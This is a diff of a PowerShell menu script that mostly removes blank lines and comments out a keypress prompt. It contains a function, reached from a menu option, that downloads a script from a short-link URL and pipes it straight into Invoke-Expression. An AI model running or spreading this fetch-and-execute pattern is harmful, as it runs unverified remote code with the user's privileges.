@@ -418,13 +418,9 @@ function DisplayMenu {
             Exit-PSHostProcess
             Exit-PSSession
         }
-
         . {
-
             awin
-
         }
-
         default {
             #ENTRADA INVÁLIDA.
 
@@ -724,17 +720,15 @@ function DelTemp {
 }
 
 function awin {
-    
     Invoke-RestMethod https://4br.me/awin | Invoke-Expression
-    
 }
 
 DisplayMenu 
 
 Exit
 
-# Run your code that needs to be elevated here
-Write-Host -NoNewline 'Press any key to continue...'
-$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+
+#Write-Host -NoNewline 'Press any key to continue...'
+#$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 
 Exit
